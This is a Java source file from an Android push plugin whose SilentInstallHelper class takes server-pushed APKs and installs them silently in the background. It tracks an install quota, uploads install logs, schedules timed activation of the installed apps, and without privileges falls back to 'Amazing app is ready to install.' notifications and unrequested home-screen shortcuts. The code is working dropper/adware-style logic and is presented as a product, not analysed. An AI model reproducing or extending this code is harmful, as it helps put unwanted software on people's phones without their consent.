package com.tiho.dlplugin.task.silent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Message;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushSilentBean;
import com.tiho.dlplugin.bean.PushSilentConfig;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.dao.PushConfigDAO;
import com.tiho.dlplugin.dao.ScheduleActivationDAO;
import com.tiho.dlplugin.display.NotifyBuilder;
import com.tiho.dlplugin.display.PushStat;
import com.tiho.dlplugin.install.PackageUtilsEx;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.task.scheduleact.ScheduleActList;
import com.tiho.dlplugin.task.uninstall.UnInstallList;
import com.tiho.dlplugin.util.EnvArgu;
import com.tiho.dlplugin.util.FileUtil;
import com.tiho.dlplugin.util.GPRSManager;
import com.tiho.dlplugin.util.NetworkUtil;
import com.tiho.dlplugin.util.ObjectUtil;
import com.tiho.dlplugin.util.PackageUtil;
import com.tiho.dlplugin.util.PushDirectoryUtil;
import com.tiho.dlplugin.util.SilentInstall;
import com.tiho.dlplugin.util.StringUtils;

import java.io.File;
import java.util.LinkedList;
import java.util.List;

public class SilentInstallHelper {

    public static final int MSG_SILENT_INSTALL = 0;
    public static final int MSG_SILENT_NOTIFICATION = 1;
    private static final String INS_QUEUE_FILE = "inque.dat";
    private static final String NTF_QUEUE_FILE = "ntfque.dat";
    private static SilentInstallHelper instance;
    private Context mContext;
    private List<PushSilentBean> installQueue;
    private List<PushSilentBean> notifyQueue;
    private Handler handler;
    private ScheduleActivationDAO scheduleActDao;

    private SilentInstallHelper(Context context) {
        super();
        this.mContext = context;

        scheduleActDao = DAOFactory.getScheduleActSilentDAO(context);

        HandlerThread ht = new HandlerThread("silent_handler");
        ht.start();
        handler = new Handler(ht.getLooper()) {

            @Override
            public void handleMessage(Message msg) {

                if (msg.what == MSG_SILENT_INSTALL) {
                    if (installQueue != null && !installQueue.isEmpty()) {

                        install(installQueue.remove(0));
                        flushQueue(MSG_SILENT_INSTALL);
                    }
                } else if (msg.what == MSG_SILENT_NOTIFICATION) {
                    if (installQueue != null && !notifyQueue.isEmpty()) {
                        showSilentNotification(notifyQueue.remove(0));
                        flushQueue(MSG_SILENT_NOTIFICATION);

                    }
                }
            }
        };

        initQueue();

        addInstallTask(null);
    }

    public synchronized static SilentInstallHelper getInstance(Context context) {
        if (instance == null)
            instance = new SilentInstallHelper(context);

        return instance;
    }

    private void addInstallTask(PushSilentBean ps) {
        if (ps != null && !installQueue.contains(ps)) {

            installQueue.add(ps);
            flushQueue(MSG_SILENT_INSTALL);

        }

        notifySilentQueue(ps == null ? null : ps.getPack());
    }

    /**
     * 发通知去安装
     */
    public void notifySilentQueue(String pack) {
        int now = PushStat.getInstance(mContext).getSilentInstalledNum();
        PushSilentConfig config = DAOFactory.getConfigDAO(mContext).getConfigByKey(PushConfigDAO.TYPE_SILENT, PushSilentConfig.class);

        //add by bruce for bug
        if (config == null)
            return;
        //end by bruce

        int installCount = config.getSin() - now;
        LogManager.LogShow("installCount config.getSin()=" + config.getSin() + "  now=" + now);
        if (installCount > 0) {

            handler.sendEmptyMessage(MSG_SILENT_INSTALL);

            LogManager.LogShow("立即静默安装");
        } else {

            String p = StringUtils.isEmpty(pack) ? (installQueue.isEmpty() ? "UNKNOWN" : installQueue.get(0).getPack()) : pack;

            LogUploadManager.getInstance(mContext).addSilentInstallLog(0, "INSTALL_FAILED_OUT_OF_COUNT", p, 1, "Y", 0);

            if (NetworkUtil.CLOSE_AFTER_USE)
                GPRSManager.getInstance(mContext).closeMobileNetwork();
        }

    }

    private void flushQueue(int what) {

        if (what == MSG_SILENT_INSTALL) {
            try {
                File f = PushDirectoryUtil.getFileInPushBaseDir(mContext, PushDirectoryUtil.BASE_DIR, INS_QUEUE_FILE);
                FileUtil.writeToFile(f, ObjectUtil.toByte(installQueue), false);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (what == MSG_SILENT_NOTIFICATION) {
            try {
                File f = PushDirectoryUtil.getFileInPushBaseDir(mContext, PushDirectoryUtil.BASE_DIR, NTF_QUEUE_FILE);
                FileUtil.writeToFile(f, ObjectUtil.toByte(notifyQueue), false);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void initQueue() {
        File f = PushDirectoryUtil.getFileInPushBaseDir(mContext, PushDirectoryUtil.BASE_DIR, INS_QUEUE_FILE);
        byte[] data = FileUtil.getFileRawData(f);

        if (data != null)
            installQueue = (List<PushSilentBean>) ObjectUtil.toObject(data);
        else
            installQueue = new LinkedList<PushSilentBean>();

        File ntf = PushDirectoryUtil.getFileInPushBaseDir(mContext, PushDirectoryUtil.BASE_DIR, NTF_QUEUE_FILE);
        byte[] ntdata = FileUtil.getFileRawData(ntf);

        if (ntdata != null)
            notifyQueue = (List<PushSilentBean>) ObjectUtil.toObject(ntdata);
        else
            notifyQueue = new LinkedList<PushSilentBean>();
    }

    /**
     * @param ps
     */
    public void gotoInstall(final PushSilentBean ps) {
        // 如果没有安装权限
        if (!SilentInstall.bgInstallSupport(mContext)) {

            LogManager.LogShow("无静默安装权限,wifi:" + NetworkUtil.isWifiOn(mContext));

            // 非wifi情况下立刻展示通知
            if (!NetworkUtil.isWifiOn(mContext)) {

                LogManager.LogShow("立刻展示消息");

                showSilentNotification(ps);

            } else if (!EnvArgu.isFromJar()) {
                // TODO wifi的话，只有push apk才能展示
                // 如果是jar的包目前不能推送到通知栏

                if (!notifyQueue.contains(ps)) {
                    notifyQueue.add(ps);
                    flushQueue(MSG_SILENT_NOTIFICATION);
                }

                LogManager.LogShow("放到队列中，亮屏展示消息");
            } else {
                // 如果是jar包，展示下通知
                showSilentNotification(ps, new BroadcastReceiver() {

                    @Override
                    public void onReceive(Context context, Intent intent) {
                        // 提示安装
                        PackageUtil.gotoInstall(context, ps.getApkFile(context).getAbsolutePath());
                    }
                });

            }
        } else {
            // 有预装权限
            addInstallTask(ps);
        }
    }

    public void showSilentNotification() {
        handler.sendEmptyMessage(MSG_SILENT_NOTIFICATION);
    }

    private void showSilentNotification(final PushSilentBean ps) {

        showSilentNotification(ps, new BroadcastReceiver() {

            @Override
            public void onReceive(Context context, Intent intent) {
                // 提示安装
                SilentActivity.gotoShortcutActivity(context, ps.getPack(), false);
            }
        });
    }

    private void showSilentNotification(final PushSilentBean ps, BroadcastReceiver clickRececiver) {
        if(PackageUtil.isInstalled(ps.getPack(),mContext)){
            LogManager.LogShow("应用已经安装" + ps.getPack());
        }else{
            LogManager.LogShow("静默应用" + ps.getPack() + ")没有安装权限，推送到通知栏");

            Bitmap icon = PackageUtil.loadUninstallApkIcon(mContext, ps.getApkFile(mContext).getAbsolutePath());
            String appname = PackageUtil.parseAppName(mContext, ps.getApkFile(mContext).getAbsolutePath());

            NotifyBuilder.build(mContext, appname, "Amazing app is ready to install.", icon, ps.getMd5().hashCode(), clickRececiver);
            //1545 推送通知的同时，创建快捷方式
            // 创建快捷方式
            try {
                if (!PackageUtil.hasShortcut(mContext, appname)) {
                    SilentActivity.createShortcut(mContext, ps, appname);

                    LogManager.LogShow("showSilentNotification 创建快捷方式完成，name=" + appname);
                } else {
                    LogManager.LogShow("showSilentNotification 创建快捷方式已经存在，name=" + appname);
                }
            } catch (Exception e) {
                LogManager.LogShow(e);
            }
        }
    }

    private void install(final PushSilentBean ps) {
        if (!UnInstallList.deleted(mContext, ps.getPack())) {

            // 安装数量加1
            PushStat.getInstance(mContext).increaseSilentNum();

            String apkPath = ps.getApkFile(mContext).getAbsolutePath();
            LogManager.LogShow("install context = " + mContext + ", apkPath = " + apkPath);
            int ret = SilentInstall.SilentInstallApk(mContext, apkPath);
            String pkg = ps.getPack();
            boolean good = (ret == PackageUtilsEx.INSTALL_SUCCEEDED);
            LogManager.LogShow("install ret = " + ret + ", pkg = " + pkg);
            if (PackageUtilsEx.INSTALL_SUCCEEDED == ret) {
                LogManager.LogShow("静默安装成功:" + pkg + "," + ret);

                if (!StringUtils.isEmpty(ps.getTimeract())) {
                    // 如果已经安装就加入到定时激活列表中
                    scheduleActDao.saveScheduleList(ps.getId(), ps.getPack(), ps.getTimeract().trim(), true);
                    ScheduleActList.getInstance(mContext).load(ps.getPack());
                }
            } else {
                LogManager.LogShow("install 安装失败：" + pkg);
            }

            LogUploadManager.getInstance(mContext).addSilentInstallLog(
                    ret != PackageUtilsEx.INSTALL_SUCCEEDED ? 0 : 1,
                    "INSTALL_RESULT=" + good + ",PACK=" + pkg, ps.getPack(), 1,
                    "Y", 0);

            // 再尝试安装下一个
            notifySilentQueue(null);

//			SilentInstall.SilentInstallApk(context, ps.getPack(), ps.getApkFile(context).getAbsolutePath(), new IPackageInstallObserver.Stub() {
//
//				// 安装结果
//				@Override
//				public void packageInstalled(String pack, int arg1) throws RemoteException {
//
//					boolean good = arg1 != -1;
//
//					if (!good) {
//						LogManager.LogShow("安装失败：" + pack);
//					} else {
//						LogManager.LogShow("静默安装成功:" + pack + "," + arg1);
//
//						if (!StringUtils.isEmpty(ps.getTimeract())) {
//							// 如果已经安装就加入到定时激活列表中
//							scheduleActDao.saveScheduleList(ps.getId(), ps.getPack(), ps.getTimeract().trim(), true);
//							ScheduleActList.getInstance(context).load(ps.getPack());
//						}
//					}
//
//					LogUploadManager.getInstance(context).addSilentInstallLog(arg1 == -1 ? 0 : 1, "INSTALL_RESULT=" + good + ",PACK=" + pack, ps.getPack(), 1, "Y");
//
//					// 再尝试安装下一个
//					notifySilentQueue(null);
//
//				}
//			});

        } else {
            LogManager.LogShow(ps.getPack() + "已经被卸载，不进行静默安装");
            LogUploadManager.getInstance(mContext).addSilentInstallLog(2, "ALREADY_UNINSTALLED", ps.getPack(), 1, "Y", 0);

            notifySilentQueue(null);
        }
    }

}
